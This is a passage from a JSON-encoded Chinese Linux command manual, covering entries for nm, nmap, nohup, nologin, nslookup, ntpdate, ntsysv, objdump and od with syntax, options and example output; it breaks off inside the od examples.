被用于显示二进制目标文件的符号表。\n\n### 语法  \n\n```\nnm(选项)(参数)\n```\n\n### 选项  \n\n```\n-A：每个符号前显示文件名；\n-D：显示动态符号；\n-g：仅显示外部符号；\n-r：反序显示符号表。\n```\n\n### 参数  \n\n目标文件：二进制目标文件，通常是库文件和可执行文件。\n\n\n"},{"name":"nmap","categoryId":0,"data":"nmap\n\u003d\u003d\u003d\n\n网络探测和安全审核\n\n## 补充说明\n\n**nmap命令** 是一款开放源代码的网络探测和安全审核工具，它的设计目标是快速地扫描大型网络。\n\n### 语法  \n\n```\nnmap(选项)(参数)\n```\n\n### 选项  \n\n```\n-O：激活操作探测；\n-P0：值进行扫描，不ping主机；\n-PT：是同TCP的ping；\n-sV：探测服务版本信息；\n-sP：ping扫描，仅发现目标主机是否存活；\n-ps：发送同步（SYN）报文；\n-PU：发送udp ping；\n-PE：强制执行直接的ICMPping；\n-PB：默认模式，可以使用ICMPping和TCPping；\n-6：使用IPv6地址；\n-v：得到更多选项信息；\n-d：增加调试信息地输出；\n-oN：以人们可阅读的格式输出；\n-oX：以xml格式向指定文件输出信息；\n-oM：以机器可阅读的格式输出；\n-A：使用所有高级扫描选项；\n--resume：继续上次执行完的扫描；\n-P：指定要扫描的端口，可以是一个单独的端口，用逗号隔开多个端口，使用“-”表示端口范围；\n-e：在多网络接口Linux系统中，指定扫描使用的网络接口；\n-g：将指定的端口作为源端口进行扫描；\n--ttl：指定发送的扫描报文的生存期；\n--packet-trace：显示扫描过程中收发报文统计；\n--scanflags：设置在扫描报文中的TCP标志。\n```\n\n### 参数  \n\nip地址：指定待扫描报文中的TCP地址。\n\n### 实例  \n\n **安装nmap** \n\n```\nyum install nmap\n```\n\n **使用nmap扫描www.jsdig.com的开放端口** \n\n```\n[root@localhost ~]# nmap www.jsdig.com\n\nStarting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-12-28 00:06 CST\nInteresting ports on 100-42-212-8.static.webnx.com (100.42.212.8):\nNot shown: 1678 filtered ports\nPORT   STATE service\n22/tcp open  ssh\n80/tcp open  http\n\nNmap finished: 1 IP address (1 host up) scanned in 45.870 seconds\n```\n\n\n"},{"name":"nohup","categoryId":0,"data":"nohup\n\u003d\u003d\u003d\n\n将程序以忽略挂起信号的方式运行起来\n\n## 补充说明\n\n**nohup命令** 可以将程序以忽略挂起信号的方式运行起来，被运行的程序的输出信息将不会显示到终端。\n\n无论是否将 nohup 命令的输出重定向到终端，输出都将附加到当前目录的 nohup.out 文件中。如果当前目录的 nohup.out 文件不可写，输出重定向到`$HOME/nohup.out`文件中。如果没有文件能创建或打开以用于追加，那么 command 参数指定的命令不可调用。如果标准错误是一个终端，那么把指定的命令写给标准错误的所有输出作为标准输出重定向到相同的文件描述符。\n\n### 语法  \n\nnohup(选项)(参数)\n\n### 选项  \n\n```\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n### 参数  \n\n程序及选项：要运行的程序及选项。\n\n### 实例  \n\n使用nohup命令提交作业，如果使用nohup命令提交作业，那么在缺省情况下该作业的所有输出都被重定向到一个名为nohup.out的文件中，除非另外指定了输出文件：\n\n```\nnohup command \u003e myout.file 2\u003e\u00261 \u0026\n```\n\n在上面的例子中，输出被重定向到myout.file文件中。\n\n\n"},{"name":"nologin","categoryId":0,"data":"nologin\n\u003d\u003d\u003d\n\n拒绝用户登录系统\n\n## 补充说明\n\n**nologin命令** 可以实现礼貌地拒绝用户登录系统，同时给出信息。如果尝试以这类用户登录，就在log里添加记录，然后在终端输出This account is currently not available信息，就是这样。一般设置这样的帐号是给启动服务的账号所用的，这只是让服务启动起来，但是不能登录系统。\n\n### 语法  \n\n```\nnologin\n```\n\n### 实例  \n\nLinux禁止用户登录：\n\n禁止用户登录后，用户不能登录系统，但可以登录ftp、SAMBA等。我们在Linux下做系统维护的时候，希望个别用户或者所有用户不能登录系统，保证系统在维护期间正常运行。这个时候我们就要禁止用户登录。  \n\n1、禁止个别用户登录，比如禁止lynn用户登录。\n\n```\npasswd -l lynn\n```\n\n这就话的意思是锁定lynn用户，这样该用户就不能登录了。  \n\n```\npasswd -u lynn\n```\n\n上面是对锁定的用户lynn进行解锁，用户可登录了。    \n\n2、我们通过修改`/etc/passwd`文件中用户登录的shell\n\n```\nvi /etc/passwd\n```\n\n更改为：\n\n```\nlynn:x:500:500::/home/lynn:/sbin/nologin\n```\n\n该用户就无法登录了。  \n\n3、禁止所有用户登录。\n\n```\ntouch /etc/nologin\n```\n\n除root以外的用户不能登录了。\n\n\n"},{"name":"nslookup","categoryId":0,"data":"nslookup\n\u003d\u003d\u003d\n\n查询域名DNS信息的工具\n\n## 补充说明\n\n**nslookup命令** 是常用域名查询工具，就是查DNS信息用的命令。\n\nnslookup4有两种工作模式，即“交互模式”和“非交互模式”。在“交互模式”下，用户可以向域名服务器查询各类主机、域名的信息，或者输出域名中的主机列表。而在“非交互模式”下，用户可以针对一个主机或域名仅仅获取特定的名称或所需信息。\n\n进入交互模式，直接输入nslookup命令，不加任何参数，则直接进入交互模式，此时nslookup会连接到默认的域名服务器（即`/etc/resolv.conf`的第一个dns地址）。或者输入`nslookup -nameserver/ip`。进入非交互模式，就直接输入`nslookup 域名`就可以了。\n\n### 语法  \n\n```\nnslookup(选项)(参数)\n```\n\n### 选项  \n\n```\n-sil：不显示任何警告信息。\n```\n\n### 参数  \n\n域名：指定要查询域名。\n\n### 实例  \n\n```\n[root@localhost ~]# nslookup www.jsdig.com\nServer:         202.96.104.15\nAddress:        202.96.104.15#53\n\nNon-authoritative answer:\nwww.jsdig.com canonical name \u003d host.1.jsdig.com.\nName:   host.1.jsdig.com\nAddress: 100.42.212.8\n```\n\n\n"},{"name":"ntpdate","categoryId":0,"data":"ntpdate\n\u003d\u003d\u003d\n\n使用网络计时协议（NTP）设置日期和时间\n\n## 补充说明\n\n**ntpdate命令** 是用来设置本地日期和时间。它从指定的每个服务器获得了一些样本，并应用标准 NTP 时钟过滤器和选择算法来选择最好的样本。\n\n此 ntpdate 命令使用以下方法进行时间调整：\n\n*   如果它确定时钟偏差超过 0.5 秒，它通过调用 settimeofday 子例程设置时钟时间。在引导时间，这是一个首选的方法。\n*   如 果它确定时钟偏差小于 0.5 秒，它通过调用 adjtime 子例程和偏移量来调整时钟时间。此方法倾向于用牺牲一些稳定性来保持漂移时钟更加准确。 当不是通过运行一个守护程序而是从 cron 命令有规则的运行ntpdate 命令时，每一小时或两小时执行一次可以保证足够的走时精度，从而避免调整时钟。\n\n使用很多服务器可以大幅度改善 ntpdate 命令的可靠性与精度。尽管能使用单一服务器，但您能通过提供至少三个或四个服务器以获得更好的性能。\n\n如果一个类似 xntpd 守护程序的 NTP 服务器守护程序正在同一主机上运行，命令将拒绝ntpdate 设置日期。\n\n你必须有 root 权限才能在主机上运行这个命令。\n\n### 语法  \n\n```\nntpdate [ -b] [ -d] [ -s] [ -u] [ -aKeyid] [ -eAuthenticationDelay] [ -kKeyFile] [ -oVersion] [ -pSamples] [ -tTimeOut] Server...\n```\n\n### 选项  \n\n\u003ctable\u003e\n\n\u003ctbody\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-aKeyid\u003c/td\u003e\n\n\u003ctd\u003e使用 Keyid 来认证全部数据包。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-b\u003c/td\u003e\n\n\u003ctd\u003e通过调用 settimeofday 子例程来增加时钟的时间。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-d\u003c/td\u003e\n\n\u003ctd\u003e指定调试方式。判断 ntpdate 命令会产生什么结果（不产生实际的结果）。结果再现在屏幕上。这个标志使用无特权的端口。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-eAuthenticationDelay\u003c/td\u003e\n\n\u003ctd\u003e指定延迟认证处理的时间秒数。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-kKeyFile\u003c/td\u003e\n\n\u003ctd\u003e当不使用缺省值 /etc/ntp.keys 文件时，为包含密钥的文件指定一个不同的名称。 请参阅文件KeyFile的描述。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-oVersion\u003c/td\u003e\n\n\u003ctd\u003e当轮询它的发出数据包时，指定使用的 NTP 版本实现。 Version 的值可以是 1，2，3。缺省值是 3。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-pSamples\u003c/td\u003e\n\n\u003ctd\u003e指定从每个服务器获取的样本的数目。 Samples 的值在 1 和 8 之间，并包括 1 和 8。它的缺省值是 4。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-s\u003c/td\u003e\n\n\u003ctd\u003e指定日志操作 syslog 设施的使用，而不是使用标准输出。 当运行 ntpdate 命令和 cron命令时，它是很有用的。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-tTimeOut\u003c/td\u003e\n\n\u003ctd\u003e指定等待响应的时间。给定 TimeOut 的值四舍五入为 0.2 秒的倍数。缺省值是 1 秒。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003ctr\u003e\n\n\u003ctd\u003e-u\u003c/td\u003e\n\n\u003ctd\u003e指定使用无特权的端口发送数据包。 当在一个对特权端口的输入流量进行阻拦的防火墙后是很有益的， 并希望在防火墙之外和主机同步。防火墙是一个系统或者计算机，它控制从外网对专用网的访问。\u003c/td\u003e\n\n\u003c/tr\u003e\n\n\u003c/tbody\u003e\n\n\u003c/table\u003e\n\n\n"},{"name":"ntsysv","categoryId":4,"data":"ntsysv\n\u003d\u003d\u003d\n\n集中管理系统的各种服务\n\n## 补充说明\n\n**ntsysv命令** 提供了一个基于文本界面的菜单操作方式，集中管理系统不同的运行等级下的系统服务启动状态。在RedHat各个发行版，CentOS各个版本，都自带这个工具。它具有互动式操作界面，您可以轻易地利用方向键和空格键等，开启，关闭操作系统在每个执行等级中，所要执行的系统服务。\n\n### 语法  \n\n```\nntsysv(选项)\n```\n\n### 选项  \n\n```\n--leve：指定运行等级；\n--back：在互动式界面里，显示Back钮，而非cancel钮。\n```\n\n### 实例  \n\n输入ntsysv命令后，出现一个交互式的管理菜单，如下：\n\n!ntsysv\n\n使用空格键选择或者取消选项！\n\n\n"},{"name":"objdump","categoryId":0,"data":"objdump\n\u003d\u003d\u003d\n\n显示二进制文件信息\n\n## 补充说明\n\n**objdump命令** 是用查看目标文件或者可执行的目标文件的构成的gcc工具。\n\n### 选项  \n\n```\n--archive-headers \n-a \n显示档案库的成员信息,类似ls -l将lib*.a的信息列出。 \n\n-b bfdname \n--target\u003dbfdname \n指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： \n\nobjdump -b oasys -m vax -h fu.o \n显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 \n\n-C \n--demangle \n将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 \n\n--debugging \n-g \n显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被readelf -w支持。 \n\n-e \n--debugging-tags \n类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 \n\n--disassemble \n-d \n从objfile中反汇编那些特定指令机器码的section。 \n\n-D \n--disassemble-all \n与 -d 类似，但反汇编所有section. \n\n--prefix-addresses \n反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 \n\n-EB \n-EL \n--endian\u003d{big|little} \n指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. \n\n-f \n--file-headers \n显示objfile中每个文件的整体头部摘要信息。 \n\n-h \n--section-headers \n--headers \n显示目标文件各个section的头部摘要信息。 \n\n-H \n--help \n简短的帮助信息。 \n\n-i \n--info \n显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 \n\n-j name\n--section\u003dname \n仅仅显示指定名称为name的section的信息 \n\n-l\n--line-numbers \n用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 \n\n-m machine \n--architecture\u003dmachine \n指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构. \n\n--reloc \n-r \n显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 \n\n--dynamic-reloc \n-R \n显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 \n\n-s \n--full-contents \n显示指定section的完整内容。默认所有的非空section都会被显示。 \n\n-S \n--source \n尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 \n\n--show-raw-insn \n反汇编的时候，显示每条汇编指令对应的机器码，如不指定--prefix-addresses，这将是缺省选项。 \n\n--no-show-raw-insn \n反汇编时，不显示汇编指令的机器码，如不指定--prefix-addresses，这将是缺省选项。 \n\n--start-address\u003daddress \n从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 \n\n--stop-address\u003daddress \n显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 \n\n-t \n--syms \n显示文件的符号表入口。类似于nm -s提供的信息 \n\n-T \n--dynamic-syms \n显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|--dynamic 显示的信息。 \n\n-V \n--version \n版本信息 \n\n--all-headers \n-x \n显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 \n\n-z \n--disassemble-zeroes \n一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 \n\n@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。\n```\n\n### 实例  \n\n首先，在给出后面大部分测试所基于的源代码以及编译指令。 源代码如下： \n\n```\nroot@localhost [test]# nl mytest.cpp \n```\n\n```\nvoid printTest() {\n    char a;\n    a \u003d \u0027a\u0027;\n}\n\nvoid printTest2() {\nint a \u003d 2;\na+\u003d2;\n} \n```\n\n对以上源代码进行编译，如下： \n\n```\n[root@localhost test]# g++ -c -g mytest.cpp \n```\n\n这里，生成的文件是mytest.o，为了方便测试包含了调试的信息，对可执行文件的测试，显示的结果类似。 \n\n **查看当前使用的objdump的版本号： ** \n\n```\n[root@localhost test]# objdump -V \nGNU objdump 2.17.50.0.6-14.el5 20061020 \nCopyright 2005 free Software Foundation, Inc. \nThis program is free software; you may redistribute it under the terms of \nthe GNU General Public License.  This program has absolutely no warranty. \n```\n\n **查看档案库文件中的信息： ** \n\n```\n[root@localhost test]# objdump -a libmy2.a \nIn archive libmy2.a: \nmyfile.o:     file format elf32-i386 \nrwxrwxrwx 0/0   2724 Nov 16 16:06 2009 myfile.o \nmytest.o:     file format elf32-i386 \nrw-r--r-- 0/0    727 Jul 13 15:32 2011 mytest.o \n```\n\n **这里，libmy2.a是一个使用ar命令将多个*.o目标文件打包而生成的静态库。命令的输出类似`ar -tv`，相比较`ar -tv`输出如下： ** \n\n```\n[root@localhost test]# ar -tv libmy2.a \nrwxrwxrwx 0/0   2724 Nov 16 16:06 2009 myfile.o \nrw-r--r-- 0/0    727 Jul 13 15:32 2011 mytest.o \n```\n\n显示可用的架构和目标结构列表： \n\n```\n[root@localhost test]# objdump -i \nBFD header file version 2.17.50.0.6-14.el5 20061020 \nelf32-i386 \n(header little endian, data little endian) \n  i386 \na.out-i386-linux \n(header little endian, data little endian) \n  i386 \nefi-app-ia32 \n(header little endian, data little endian) \n  i386 \nelf64-x86-64 \n(header little endian, data little endian) \n  i386 \nelf64-little \n(header little endian, data little endian) \n  i386 \nelf64-big \n(header big endian, data big endian) \n  i386 \nelf32-little \n(header little endian, data little endian) \n  i386 \nelf32-big \n(header big endian, data big endian) \n  i386 \nsrec \n(header endianness unknown, data endianness unknown) \n  i386 \nsymbolsrec \n(header endianness unknown, data endianness unknown) \n  i386 \ntekhex \n(header endianness unknown, data endianness unknown) \n  i386 \nbinary \n(header endianness unknown, data endianness unknown) \n  i386 \nihex \n(header endianness unknown, data endianness unknown) \n  i386 \ntrad-core \n(header endianness unknown, data endianness unknown) \n\n              elf32-i386 a.out-i386-linux efi-app-ia32 elf64-x86-64 \n          i386 elf32-i386 a.out-i386-linux efi-app-ia32 elf64-x86-64 \n\n              elf64-little elf64-big elf32-little elf32-big srec symbolsrec \n          i386 elf64-little elf64-big elf32-little elf32-big srec symbolsrec \n\n              tekhex binary ihex trad-core \n          i386 tekhex binary ihex --------- \n```\n\n这里，显示的信息是相对于 -b 或者 -m 选项可用的架构和目标格式列表。 \n\n **显示mytest.o文件中的text段的内容： ** \n\n```\n[root@localhost test]# objdump --section\u003d.text -s mytest.o \nmytest.o:     file format elf32-i386 \nContents of section .text: \n0000 5589e583 ec10c645 ff61c9c3 5589e583  U......E.a..U... \n0010 ec10c745 fc020000 008345fc 02c9c3    ...E......E.... \n```\n\n这里注意，不能单独使用-j或者--section，例如`objdump --section\u003d.text mytest.o`是不会运行成功的。 \n\n **反汇编mytest.o中的text段内容，并尽可能用源代码形式表示： ** \n\n```\n[root@localhost test]# objdump -j .text -S mytest.o \nmytest.o:     file format elf32-i386 \nDisassembly of section .text: \n00000000 \u003c_Z9printTestv\u003e: \nvoid printTest() \n   0:   55                      push   %ebp \n   1:   89 e5                   mov    %esp,%ebp \n   3:   83 ec 10                sub    $0x10,%esp \n{ \n        char a; \n        a \u003d \u0027a\u0027; \n   6:   c6 45 ff 61             movb   $0x61,0xffffffff(%ebp) \n} \n   a:   c9                      leave  \n   b:   c3                      ret    \n\n000000c \u003c_Z10printTest2v\u003e: \nvoid printTest2() \n   c:   55                      push   %ebp \n   d:   89 e5                   mov    %esp,%ebp \n   f:   83 ec 10                sub    $0x10,%esp \n{ \n        int a \u003d 2; \n  12:   c7 45 fc 02 00 00 00    movl   $0x2,0xfffffffc(%ebp) \n        a+\u003d2; \n  19:   83 45 fc 02             addl   $0x2,0xfffffffc(%ebp) \n} \n  1d:   c9                      leave  \n  1e:   c3                      ret    \n```\n\n这里注意，不能单独使用-j或者--section，例如`objdump -j .text mytest.o是不会运行成功的`。另外-S命令对于包含调试信息的目标文件，显示的效果比较好，如果编译时没有指定g++的-g选项，那么目标文件就不包含调试信息，那么显示效果就差多了。 \n\n **反汇编出mytest.o的源代码: ** \n\n```\n[root@localhost test]# objdump -S mytest.o \nmytest.o:     file format elf32-i386 \n\nDisassembly of section .text: \n\n00000000 \u003c_Z9printTestv\u003e: \nvoid printTest() \n   0:   55                      push   %ebp \n   1:   89 e5                   mov    %esp,%ebp \n   3:   83 ec 10                sub    $0x10,%esp \n{ \n        char a; \n        a \u003d \u0027a\u0027; \n   6:   c6 45 ff 61             movb   $0x61,0xffffffff(%ebp) \n} \n   a:   c9                      leave  \n   b:   c3                      ret    \n\n0000000c \u003c_Z10printTest2v\u003e: \nvoid printTest2() \n   c:   55                      push   %ebp \n   d:   89 e5                   mov    %esp,%ebp \n   f:   83 ec 10                sub    $0x10,%esp \n{ \n       int a \u003d 2; \n  12:   c7 45 fc 02 00 00 00    movl   $0x2,0xfffffffc(%ebp) \n        a+\u003d2; \n  19:   83 45 fc 02             addl   $0x2,0xfffffffc(%ebp) \n} \n  1d:   c9                      leave  \n  1e:   c3                      ret    \n```\n\n这里，尤其当编译的时候指定了-g这种调试参数时，反汇编的效果比较明显。隐含了-d参数。 \n\n **显示文件的符号表入口: ** \n\n```\n[root@localhost test]# objdump -t mytest.o \nmytest.o:     file format elf32-i386 \n\nSYMBOL TABLE: \n00000000 l    df *ABS*  00000000 mytest.cpp \n00000000 l    d  .text  00000000 .text \n00000000 l    d  .data  00000000 .data \n00000000 l    d  .bss   00000000 .bss \n00000000 l    d  .debug_abbrev  00000000 .debug_abbrev \n00000000 l    d  .debug_info    00000000 .debug_info \n00000000 l    d  .debug_line    00000000 .debug_line \n00000000 l    d  .debug_frame   00000000 .debug_frame \n00000000 l    d  .debug_loc     00000000 .debug_loc \n00000000 l    d  .debug_pubnames        00000000 .debug_pubnames \n00000000 l    d  .debug_aranges 00000000 .debug_aranges \n00000000 l    d  .note.GNU-stack        00000000 .note.GNU-stack \n00000000 l    d  .comment       00000000 .comment \n00000000 g     F .text  0000000c _Z9printTestv \n00000000         *UND*  00000000 __gxx_personality_v0 \n0000000c g     F .text  00000013 _Z10printTest2v \n```\n\n这里，输出的信息类似`nm -s`命令的输出，相比较之下，nm命令的输出如下： \n\n```\n[root@localhost test]# nm -s mytest.o \n0000000c T _Z10printTest2v \n00000000 T _Z9printTestv \n         U __gxx_personality_v0 \n```\n\n **显示文件的符号表入口，将底层符号解码并表示成用户级别: ** \n\n```\n[root@localhost test]# objdump -t -C mytest.o \nmytest.o:     file format elf32-i386 \nSYMBOL TABLE: \n00000000 l    df *ABS*  00000000 mytest.cpp \n00000000 l    d  .text  00000000 .text \n00000000 l    d  .data  00000000 .data \n00000000 l    d  .bss   00000000 .bss \n00000000 l    d  .debug_abbrev  00000000 .debug_abbrev \n00000000 l    d  .debug_info    00000000 .debug_info \n00000000 l    d  .debug_line    00000000 .debug_line \n00000000 l    d  .debug_frame   00000000 .debug_frame \n00000000 l    d  .debug_loc     00000000 .debug_loc \n00000000 l    d  .debug_pubnames        00000000 .debug_pubnames \n00000000 l    d  .debug_aranges 00000000 .debug_aranges \n00000000 l    d  .note.GNU-stack        00000000 .note.GNU-stack \n00000000 l    d  .comment       00000000 .comment \n00000000 g     F .text  0000000c printTest() \n00000000         *UND*  00000000 __gxx_personality_v0 \n0000000c g     F .text  00000013 printTest2() \n```\n\n这里，和没-C相比，printTest2函数可读性增加了。 \n\n **反汇编目标文件的特定机器码段： ** \n\n```\n[root@localhost test]# objdump -d mytest.o \nmytest.o:     file format elf32-i386 \nDisassembly of section .text: \n\n00000000 \u003c_Z9printTestv\u003e: \n   0:   55                      push   %ebp \n   1:   89 e5                   mov    %esp,%ebp \n   3:   83 ec 10                sub    $0x10,%esp \n   6:   c6 45 ff 61             movb   $0x61,0xffffffff(%ebp) \n   a:   c9                      leave  \n  b:   c3                      ret    \n\n0000000c \u003c_Z10printTest2v\u003e: \n   c:   55                      push   %ebp \n   d:   89 e5                   mov    %esp,%ebp \n   f:   83 ec 10                sub    $0x10,%esp \n  12:   c7 45 fc 02 00 00 00    movl   $0x2,0xfffffffc(%ebp) \n  19:   83 45 fc 02             addl   $0x2,0xfffffffc(%ebp) \n  1d:   c9                      leave  \n  1e:   c3                      ret    \n```\n\n这里，对text段的内容进行了反汇编。 \n\n **反汇编特定段，并将汇编代码对应的文件名称和行号对应上： ** \n\n```\n[root@localhost test]# objdump -d -l mytest.o\nmytest.o:     file format elf32-i386 \nDisassembly of section .text: \n\n00000000 \u003c_Z9printTestv\u003e: \n_Z9printTestv(): \n/root/test/04_libraryTest/mytest.cpp:1 \n   0:   55                      push   %ebp \n   1:   89 e5                   mov    %esp,%ebp \n   3:   83 ec 10                sub    $0x10,%esp \n/root/test/04_libraryTest/mytest.cpp:4 \n   6:   c6 45 ff 61             movb   $0x61,0xffffffff(%ebp) \n/root/test/04_libraryTest/mytest.cpp:5 \n   a:   c9                      leave  \n   b:   c3                      ret    \n\n0000000c \u003c_Z10printTest2v\u003e: \n_Z10printTest2v(): \n/root/test/04_libraryTest/mytest.cpp:6 \n   c:   55                      push   %ebp \n   d:   89 e5                   mov    %esp,%ebp \n   f:   83 ec 10                sub    $0x10,%esp \n/root/test/04_libraryTest/mytest.cpp:8 \n  12:   c7 45 fc 02 00 00 00    movl   $0x2,0xfffffffc(%ebp) \n/root/test/04_libraryTest/mytest.cpp:9 \n  19:   83 45 fc 02             addl   $0x2,0xfffffffc(%ebp) \n/root/test/04_libraryTest/mytest.cpp:10 \n  1d:   c9                      leave  \n  1e:   c3                      ret    \n```\n\n这里，项\"-d\"从objfile中反汇编那些特定指令机器码的section，而使用\"-l\"指定用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用，使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 \n\n **显示目标文件各个段的头部摘要信息： ** \n\n```\n[root@localhost test]# objdump -h mytest.o \nmytest.o:     file format elf32-i386 \n\nSections: \nIdx Name          Size      VMA       LMA       File off  Algn \n  0 .text         0000001f  00000000  00000000  00000034  2**2 \n                  CONTENTS, ALLOC, LOAD, readonly, CODE \n  1 .data         00000000  00000000  00000000  00000054  2**2 \n                  CONTENTS, ALLOC, LOAD, DATA \n  2 .bss          00000000  00000000  00000000  00000054  2**2 \n                  ALLOC \n  3 .debug_abbrev 00000046  00000000  00000000  00000054  2**0 \n                  CONTENTS, READONLY, DEBUGGING \n  4 .debug_info   000000ed  00000000  00000000  0000009a  2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n  5 .debug_line   0000003e  00000000  00000000  00000187  2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n  6 .debug_frame  00000044  00000000  00000000  000001c8  2**2 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n  7 .debug_loc    00000058  00000000  00000000  0000020c  2**0 \n                  CONTENTS, READONLY, DEBUGGING \n  8 .debug_pubnames 0000002f  00000000  00000000  00000264  2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n  9 .debug_aranges 00000020  00000000  00000000  00000293  2**0 \n                  CONTENTS, RELOC, READONLY, DEBUGGING \n10 .comment      0000002e  00000000  00000000  000002b3  2**0 \n                  CONTENTS, READONLY \n11 .note.GNU-stack 00000000  00000000  00000000  000002e1  2**0 \n                  CONTENTS, READONLY \n```\n\n这里，更多的内容参见`man objdump`中的这个选项。\n\n\n"},{"name":"od","categoryId":6,"data":"od\n\u003d\u003d\u003d\n\n输出文件的八进制、十六进制等格式编码的字节\n\n## 补充说明\n\n**od命令** 用于输出文件的八进制、十六进制或其它格式编码的字节，通常用于显示或查看文件中不能直接显示在终端的字符。\n\n常见的文件为文本文件和二进制文件。此命令主要用来查看保存在二进制文件中的值。比如，程序可能输出大量的数据记录，每个数据是一个单精度浮点数。这些数据记录存放在一个文件中，如果想查看下这个数据，这时候od命令就派上用场了。在我看来，od命令主要用来格式化输出文件数据，即对文件中的数据进行无二义性的解释。不管是IEEE754格式的浮点数还是ASCII码，od命令都能按照需求输出它们的值。\n\n### 语法  \n\n```\nod(选项)(参数)\n```\n\n### 选项  \n\n```\n-a：此参数的效果和同时指定“-ta”参数相同；\n-A：\u003c字码基数\u003e：选择以何种基数计算字码；\n-b：此参数的效果和同时指定“-toC”参数相同；\n-c：此参数的效果和同时指定“-tC”参数相同；\n-d：此参数的效果和同时指定“-tu2”参数相同；\n-f：此参数的效果和同时指定“-tfF”参数相同；\n-h：此参数的效果和同时指定“-tx2”参数相同；\n-i：此参数的效果和同时指定“-td2”参数相同；\n-j\u003c字符数目\u003e或--skip-bytes\u003d\u003c字符数目\u003e：略过设置的字符数目；\n-l：此参数的效果和同时指定“-td4”参数相同；\n-N\u003c字符数目\u003e或--read-bytes\u003d\u003c字符数目\u003e：到设置的字符树目为止；\n-o：此参数的效果和同时指定“-to2”参数相同；\n-s\u003c字符串字符数\u003e或--strings\u003d\u003c字符串字符数\u003e：只显示符合指定的字符数目的字符串；\n-t\u003c输出格式\u003e或--format\u003d\u003c输出格式\u003e：设置输出格式；\n-v或--output-duplicates：输出时不省略重复的数据；\n-w\u003c每列字符数\u003e或--width\u003d\u003c每列字符数\u003e：设置每列的最大字符数；\n-x：此参数的效果和同时指定“-h”参数相同；\n--help：在线帮助；\n--version：显示版本信息。\n```\n\n### 参数  \n\n文件：指定要显示的文件。\n\n### 实例  \n\n```\n[linuxde@localhost ~]$ echo abcdef g \u003e tmp\n[linuxde@localhost ~]$ cat tmp\nabcdef g\n```\n\n说明：先准备一个tmp文件\n\n```\n[linuxde@localhost ~]$ od -b tmp\n0000000 141 142 143 144 145 146 040 147 012\n0000011\n```\n\n说明：使用单字节八进制解释进行输出，注意左侧的默认地址格式为八字节\n\n```\n[linuxde@localhost ~]$ od -c tmp\n0000000   a   b   c   d   e   f       g  \\n\n0000011\n```\n\n说明：使用ASCII码进行输出，注意其中包括转义字符\n\n```\n[linuxde@localhost ~]$ od -t d1 tmp\n0000000   97   98   99  100  101  102   32  103   10\n0000011\n```\n\n说明：使用单字节十进制进行解释\n\n```\n[linuxde@localhost ~]$ od -A d -c tmp\n0000000   a   b   c   d   e   f       g  \\n\n0000009\n```\n\n说明：设置地址格式为十进制。\n\n```\n[linuxde@localhost ~]$ od -A x -c tmp\n000000   a   b   c   d   e   f       g  \\n\n000009\n```\n\n说明：设置地址格式为十六进制\n\n```\n[linuxde@localhost ~]$ od -j 2 -c tmp\n0000002   c   d   e   f       g  \\n\n0000011\n```\n\n说明：跳过开始的两个字节\n\n```\n[linuxde@localhost ~]$ od -N 2 -j 2 -c tmp\n0000002   c   d\n0000004\n```\n\n说明：跳过开始的两个字节，并且仅输出两个字节\n\n```\n[linuxde@localhost ~]$ od -w1 -c tmp\n0000000   a\n0000001   b\n0000002   c\n0000003   d\n0000004   e\n0000005   f\n0000006   \n0000007   g\n0000010  \\n\n0000011\n```\n\n说明：每行仅输出1个字节\n\n```\n[linuxde@localhost ~]$ od -w2 -c tmp\n0000000   a   b\n0000002   c   d\n0000004   e   f\n0000006       g\n0000010  \\n\n0000011\n```\n\n说明：每行输出两个字节\n\n```\n[linuxde@localhost ~]$ od -w3 -b 